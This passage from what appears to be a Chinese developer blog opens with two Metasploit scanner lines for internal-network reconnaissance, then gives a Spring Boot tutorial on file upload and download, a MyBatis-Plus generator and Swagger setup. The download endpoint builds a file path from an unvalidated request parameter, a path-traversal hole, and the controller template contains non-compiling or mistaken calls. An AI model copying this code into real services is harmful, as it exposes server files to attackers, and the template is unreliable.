auxiliary<span class="hljs-regexp">/scanner/</span>db2/db2_version            <span class="hljs-comment">#探测内网的db2服务，基于默认的50000端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname             <span class="hljs-comment">#探测内网主机的netbios名字</span></code></pre>

]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot工具类</title>
    <url>/2022/04/29/springbooot-upload-file/</url>
    <content><![CDATA[<h1 id="javaweb中图片文件上传和下载"><a href="#javaweb中图片文件上传和下载" class="headerlink" title="javaweb中图片文件上传和下载"></a>javaweb中图片文件上传和下载</h1><p>使用springboot创建web项目</p>
<p>服务端要接收客户端页面上传的文件，通常都会使用Apache的两个组件:</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">commons-fileupload</span>
<span class="hljs-attribute">commons-io</span></code></pre>

<p>Spring框架在spring-web包中对文件上传进行了封装，大大简化了服务端代码，实现步骤如下：</p>
<h2 id="1-创建Controller"><a href="#1-创建Controller" class="headerlink" title="1.创建Controller"></a>1.创建Controller</h2><p>因为图片上传是一个公共接口所以可以创建一个名为<code>CommonController</code>的文件，url地址为<code>/common</code></p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 主要用于文件上传和下载</span>
<span class="hljs-comment"> */</span>

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/common&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonController</span> </span>&#123;
	<span class="hljs-meta">@Value(&quot;$&#123;reggie.path&#125;&quot;)</span> <span class="hljs-comment">// 保存图片的路径</span>
    <span class="hljs-keyword">private</span> String basePath;
&#125;</code></pre>

<h3 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h3><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 文件上传</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> file</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> R&lt;String&gt; <span class="hljs-title">upload</span><span class="hljs-params">(MultipartFile file)</span></span>&#123;
    <span class="hljs-comment">// file是一个临时文件，后续需要进行转存</span>
    <span class="hljs-comment">// file需要与前端上传的参数名保持一致，否则无法获取到上传的文件</span>
    <span class="hljs-comment">// 转存之前需要对文件名进行处理</span>
    String originalFilename = file.getOriginalFilename();
    String suffix = originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));

    <span class="hljs-comment">// 防止文件被覆盖，使用uuid作为文件名</span>
    String filename = UUID.randomUUID().toString();
    filename = filename + suffix;

    File dir = <span class="hljs-keyword">new</span> File(basePath); <span class="hljs-comment">// 判断文件夹是否存在不存在则创建</span>
    <span class="hljs-keyword">if</span> (!dir.exists())&#123;
        dir.mkdir();
    &#125;
    <span class="hljs-comment">// 将图片保存的指定位置</span>
    <span class="hljs-keyword">try</span> &#123;
        file.transferTo(<span class="hljs-keyword">new</span> File(basePath + filename));
    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
        e.printStackTrace();
    &#125;
    <span class="hljs-keyword">return</span> R.success(filename);
&#125;</code></pre>



<h3 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h3><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">download</span><span class="hljs-params">(String name, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;
    <span class="hljs-comment">// 文件输入流读取本地文件</span>
    FileInputStream fileInputStream = <span class="hljs-keyword">null</span>;
    <span class="hljs-comment">// 使用响应输出流将图片显示在网页上</span>
    ServletOutputStream outputStream = <span class="hljs-keyword">null</span>;

    <span class="hljs-keyword">try</span> &#123;
        fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(basePath + name));
        outputStream = response.getOutputStream();
        response.setContentType(<span class="hljs-string">&quot;image/jpeg&quot;</span>);
        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];
        <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;
        <span class="hljs-comment">// 读取服务器上的图片后 由响应输出流</span>
        <span class="hljs-keyword">while</span>( (len = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>)&#123;
            outputStream.write(bytes, <span class="hljs-number">0</span>, len);
            outputStream.flush();
        &#125;

    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
        e.printStackTrace();
    &#125; <span class="hljs-keyword">finally</span> &#123;
        fileInputStream.close();
        outputStream.close();
    &#125;
&#125;</code></pre>



<h2 id="2-前端页面"><a href="#2-前端页面" class="headerlink" title="2.前端页面"></a>2.前端页面</h2><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文件上传<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 引入样式 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../plugins/element-ui/index.css&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../styles/common.css&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../styles/page.css&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;addBrand-container&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;food-add-app&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">el-upload</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;avatar-uploader&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/common/upload&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">:show-file-list</span>=<span class="hljs-string">&quot;false&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">:on-success</span>=<span class="hljs-string">&quot;handleAvatarSuccess&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">:before-upload</span>=<span class="hljs-string">&quot;beforeUpload&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;imageUrl&quot;</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">&quot;imageUrl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;avatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">v-else</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;el-icon-plus avatar-uploader-icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-upload</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/vue/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 引入组件库 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/element-ui/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 引入axios --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/axios/axios.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../js/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
<span class="javascript">      <span class="hljs-keyword">new</span> Vue(&#123;</span>
<span class="javascript">        el: <span class="hljs-string">&#x27;#food-add-app&#x27;</span>,</span>
<span class="javascript">        <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;</span>
<span class="javascript">          <span class="hljs-keyword">return</span> &#123;</span>
<span class="javascript">            imageUrl: <span class="hljs-string">&#x27;&#x27;</span></span>
          &#125;
        &#125;,
        methods: &#123;
          handleAvatarSuccess (response, file, fileList) &#123;
<span class="javascript">              <span class="hljs-built_in">this</span>.imageUrl = <span class="hljs-string">`/common/download?name=<span class="hljs-subst">$&#123;response.data&#125;</span>`</span></span>
          &#125;,
          beforeUpload (file) &#123;
            if(file)&#123;
<span class="javascript">              <span class="hljs-keyword">const</span> suffix = file.name.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>]</span>
<span class="javascript">              <span class="hljs-keyword">const</span> size = file.size / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> &lt; <span class="hljs-number">2</span></span>
<span class="javascript">              <span class="hljs-keyword">if</span>([<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>].indexOf(suffix) &lt; <span class="hljs-number">0</span>)&#123;</span>
<span class="javascript">                <span class="hljs-built_in">this</span>.$message.error(<span class="hljs-string">&#x27;上传图片只支持 png、jpeg、jpg 格式！&#x27;</span>)</span>
<span class="javascript">                <span class="hljs-built_in">this</span>.$refs.upload.clearFiles()</span>
<span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span></span>
              &#125;
              if(!size)&#123;
<span class="javascript">                <span class="hljs-built_in">this</span>.$message.error(<span class="hljs-string">&#x27;上传文件大小不能超过 2MB!&#x27;</span>)</span>
<span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span></span>
              &#125;
<span class="javascript">              <span class="hljs-keyword">return</span> file</span>
            &#125;
          &#125;
        &#125;
      &#125;)
    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>

<h1 id="mybatis-plus-generator"><a href="#mybatis-plus-generator" class="headerlink" title="mybatis-plus-generator"></a>mybatis-plus-generator</h1><p>MP的代码生成器，可以节约创建文件的时间</p>
<h2 id="1-导入依赖"><a href="#1-导入依赖" class="headerlink" title="1.导入依赖"></a>1.导入依赖</h2><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--代码生成器--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<h2 id="2-编写生成器代码"><a href="#2-编写生成器代码" class="headerlink" title="2.编写生成器代码"></a>2.编写生成器代码</h2><p>可以放在专门的工具类包下</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.utils;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.FastAutoGenerator;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.config.OutputFile;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine;

<span class="hljs-keyword">import</span> java.util.Collections;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * mp代码生成器</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CodeGenreator</span> </span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;
        generator();
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">generator</span><span class="hljs-params">()</span></span>&#123;
        FastAutoGenerator.create(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/admin_demo?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true&quot;</span>,
                <span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>)
                .globalConfig(builder -&gt; &#123;
                    builder.author(<span class="hljs-string">&quot;sunzy&quot;</span>) <span class="hljs-comment">// 设置作者</span>
                            .enableSwagger() <span class="hljs-comment">// 开启 swagger 模式</span>
                            .fileOverride() <span class="hljs-comment">// 覆盖已生成文件</span>
                            .outputDir(<span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\java\\&quot;</span>); <span class="hljs-comment">// 指定输出目录</span>
                &#125;)
                .packageConfig(builder -&gt; &#123;
                    builder.parent(<span class="hljs-string">&quot;com.sunzy&quot;</span>) <span class="hljs-comment">// 设置父包名</span>
                            .moduleName(<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment">// 设置父包模块名</span>
                            .pathInfo(Collections.singletonMap(OutputFile.xml, <span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\resources\\mapper\\&quot;</span>)); <span class="hljs-comment">// 设置mapperXml生成路径 OutputEile.xml这里可能会报错 根据版本修改</span>
                &#125;)
                .strategyConfig(builder -&gt; &#123;
                    builder.entityBuilder().enableLombok();
                    builder.mapperBuilder().enableMapperAnnotation().build();
                    builder.controllerBuilder().enableHyphenStyle()  <span class="hljs-comment">// 连字符转驼峰</span>
                            .enableRestStyle();  <span class="hljs-comment">// 开启rest控制器</span>
                    builder.addInclude(<span class="hljs-string">&quot;sys_user&quot;</span>) <span class="hljs-comment">// 设置需要生成的表名</span>
                            .addTablePrefix(<span class="hljs-string">&quot;t_&quot;</span>, <span class="hljs-string">&quot;sys_&quot;</span>); <span class="hljs-comment">// 设置过滤表前缀</span>
                &#125;)
<span class="hljs-comment">//                .templateEngine(new FreemarkerTemplateEngine()) // 使用Freemarker引擎模板，默认的是Velocity引擎模板</span>
                .execute();

    &#125;
&#125;
</code></pre>

<p>完成后，直接运行改工具类就可以直接生成以下文件：</p>
<p>UserMapper.java IUserService.java UserServiceImpl.java UserController.java</p>
<h2 id="3-Controller模板"><a href="#3-Controller模板" class="headerlink" title="3.Controller模板"></a>3.Controller模板</h2><p>可以根据需要修改自己的模板</p>
<pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> $&#123;<span class="hljs-keyword">package</span>.Controller&#125;;


<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.*;
<span class="hljs-keyword">import</span> javax.<span class="hljs-keyword">annotation</span>.Resource;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Service&#125;.$&#123;table.serviceName&#125;;
<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Entity&#125;.$&#123;entity&#125;;

#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RestController;
#<span class="hljs-keyword">else</span>
<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;
#end
#<span class="hljs-keyword">if</span>($&#123;superControllerClassPackage&#125;)
<span class="hljs-keyword">import</span> $&#123;superControllerClassPackage&#125;;
#end

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * &lt;p&gt;</span>
<span class="hljs-comment"> * $!&#123;table.comment&#125; 前端控制器</span>
<span class="hljs-comment"> * &lt;/p&gt;</span>
<span class="hljs-comment"> *</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@author</span> $&#123;author&#125;</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@since</span> $&#123;date&#125;</span>
<span class="hljs-comment"> */</span>
#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)
<span class="hljs-meta">@RestController</span>
#<span class="hljs-keyword">else</span>
<span class="hljs-meta">@Controller</span>
#end
<span class="hljs-meta">@RequestMapping(<span class="hljs-meta-string">&quot;#if(<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>)/<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>#end/#if(<span class="hljs-subst">$&#123;controllerMappingHyphenStyle&#125;</span>)<span class="hljs-subst">$&#123;controllerMappingHyphen&#125;</span>#else<span class="hljs-subst">$&#123;table.entityPath&#125;</span>#end&quot;</span>)</span>
#<span class="hljs-keyword">if</span>($&#123;kotlin&#125;)
<span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125;#<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;) : $&#123;superControllerClass&#125;()#end

#<span class="hljs-keyword">else</span>
    #<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;)
    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125; extends $&#123;superControllerClass&#125; &#123;
    #<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125; &#123;
    #end

<span class="hljs-meta">@Resource</span>
<span class="hljs-keyword">private</span> $&#123;table.serviceName&#125; $&#123;table.entityPath&#125;Service;

<span class="hljs-comment">// 新增或者更新</span>
<span class="hljs-meta">@PostMapping</span>
<span class="hljs-keyword">public</span> boolean save(<span class="hljs-meta">@RequestBody</span> $&#123;entity&#125; $&#123;table.entityPath&#125;) &#123;
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.saveOrUpdate($&#123;table.entityPath&#125;);
&#125;

<span class="hljs-meta">@DeleteMapping(<span class="hljs-meta-string">&quot;/&#123;id&#125;&quot;</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">Boolean</span> delete(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeById(id);
&#125;

<span class="hljs-meta">@PostMapping(<span class="hljs-meta-string">&quot;/del/batch&quot;</span>)</span>
<span class="hljs-keyword">public</span> boolean deleteBatch(<span class="hljs-meta">@RequestBody</span> List&lt;Integer&gt; ids) &#123;
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeById(ids);
&#125;

<span class="hljs-meta">@GetMapping</span>
<span class="hljs-keyword">public</span> List&lt;$&#123;entity&#125;&gt; findAll() &#123;
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.list();
&#125;

<span class="hljs-meta">@GetMapping(<span class="hljs-meta-string">&quot;/&#123;id&#125;&quot;</span>)</span>
<span class="hljs-keyword">public</span> $&#123;entity&#125; findOne(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.getById(id);
&#125;

<span class="hljs-meta">@GetMapping(<span class="hljs-meta-string">&quot;/page&quot;</span>)</span>
<span class="hljs-keyword">public</span> Page&lt;$&#123;entity&#125;&gt; findPage(<span class="hljs-meta">@RequestParam</span> Integer pageNum,
<span class="hljs-meta">@RequestParam</span> Integer pageSize) &#123;
        LambdaQueryWrapper&lt;$&#123;entity&#125;&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;();
        queryWrapper.orderByDesc(<span class="hljs-string">&quot;id&quot;</span>);
        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.page(new Page&lt;&gt;(pageNum, pageSize), queryWrapper);
	&#125;
&#125;

#end
</code></pre>

<p>更多的模板可以到<code>com.baomidou.mybatis-plus-generator</code>包中复制到项目的<code>resources\templates</code>中，根据自己的需求修改模板</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220513194907662.png" alt="image-20220513194907662"></p>
<h1 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h1><h2 id="1-导入依赖-1"><a href="#1-导入依赖-1" class="headerlink" title="1.导入依赖"></a>1.导入依赖</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>



<h2 id="2-创建配置类"><a href="#2-创建配置类" class="headerlink" title="2.创建配置类"></a>2.创建配置类</h2><p>再<code>com.sunzy.fmmall.config.SwaggerConfig</code>路径下创建swagger的配置类</p>
<p>配置文档的封面信息 包括标题，版本，作者信息</p>
<p>修改需要扫面的controller包位置即可</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.config;

<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> springfox.documentation.builders.ApiInfoBuilder;
<span class="hljs-keyword">import</span> springfox.documentation.builders.PathSelectors;
<span class="hljs-keyword">import</span> springfox.documentation.builders.RequestHandlerSelectors;
<span class="hljs-keyword">import</span> springfox.documentation.service.ApiInfo;
<span class="hljs-keyword">import</span> springfox.documentation.service.Contact;
<span class="hljs-keyword">import</span> springfox.documentation.spi.DocumentationType;
<span class="hljs-keyword">import</span> springfox.documentation.spring.web.plugins.Docket;
<span class="hljs-keyword">import</span> springfox.documentation.swagger2.annotations.EnableSwagger2;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableSwagger2</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SwaggerConfig</span> </span>&#123;
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * swagger可以自动生成接口文档</span>
<span class="hljs-comment">     * 1.配置生成文档的信息</span>
<span class="hljs-comment">     * 2.配置生成规则</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     */</span>

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * Docket用来封装接口文档</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">getDocket</span><span class="hljs-params">()</span></span>&#123;
        <span class="hljs-comment">//创建封面信息对象</span>
        ApiInfoBuilder apiInfoBuilder = <span class="hljs-keyword">new</span> ApiInfoBuilder();
        apiInfoBuilder.title(<span class="hljs-string">&quot;《锋迷商城》后端接口说明&quot;</span>)
                .description(<span class="hljs-string">&quot;此文档详细说明了锋迷商城项目后端接口规范....&quot;</span>)
                .version(<span class="hljs-string">&quot;v 2.0.1&quot;</span>)
                .contact( <span class="hljs-keyword">new</span> Contact(<span class="hljs-string">&quot;sunzy&quot;</span>,<span class="hljs-string">&quot;www.suzny.com&quot;</span>,<span class="hljs-string">&quot;sunzy@wang.com&quot;</span>) );
        ApiInfo apiInfo =  apiInfoBuilder.build();

        Docket docket = <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2)
                .apiInfo(apiInfo) <span class="hljs-comment">//指定生成的文档中的封面信息：文档标题、版本、作者</span>
                .select()
                .apis(RequestHandlerSelectors.basePackage(<span class="hljs-string">&quot;com.sunzy.fmmall.controller&quot;</span>))
                .paths(PathSelectors.any())
                .build();

        <span class="hljs-keyword">return</span> docket;
    &#125;
&#125;
</code></pre>

<p>启动springboot项目访问项目地址/swagger-ui.html即可看到相关接口信息，并可以进行测试</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710113522350.png" alt="image-20220710113522350"></p>
<h2 id="3-swagger注解说明"><a href="#3-swagger注解说明" class="headerlink" title="3.swagger注解说明"></a>3.swagger注解说明</h2><blockquote>
<p>Swagger提供一套详细的注解可以对接口进行详细的说明</p>
</blockquote>
<p>@Api 类注解，对控制器类添加此注解可以对控制器进行功能说明</p>
<pre><code class="hljs reasonml">@<span class="hljs-constructor">Api(<span class="hljs-params">value</span> = <span class="hljs-string">&quot;用户管理&quot;</span>, <span class="hljs-params">tags</span> = <span class="hljs-string">&quot;提供用户注册和登录服务&quot;</span>)</span></code></pre>

<p>@ApiOperation 方法注解，对每个方法作用进行详细说明</p>
<pre><code class="hljs kotlin"><span class="hljs-meta">@ApiOperation(<span class="hljs-meta-string">&quot;用户登录接口&quot;</span>)</span></code></pre>

<p>@ApiImplicitParams和@ApiImplicitParam 对方法中的参数进行详细的说明，包括字段名，备注，是否必须，以及默认值</p>
<pre><code class="hljs less"><span class="hljs-variable">@ApiImplicitParams</span>(
        <span class="hljs-variable">@ApiImplicitParam</span>(dataType = <span class="hljs-string">&quot;string&quot;</span>, name = <span class="hljs-string">&quot;username&quot;</span>, value = <span class="hljs-string">&quot;用户账号&quot;</span>, required = true),
        <span class="hljs-variable">@ApiImplicitParam</span>(dataType = <span class="hljs-string">&quot;string&quot;</span>, name = <span class="hljs-string">&quot;password&quot;</span>, value = <span class="hljs-string">&quot;用户密码&quot;</span>, required = true)
)</code></pre>

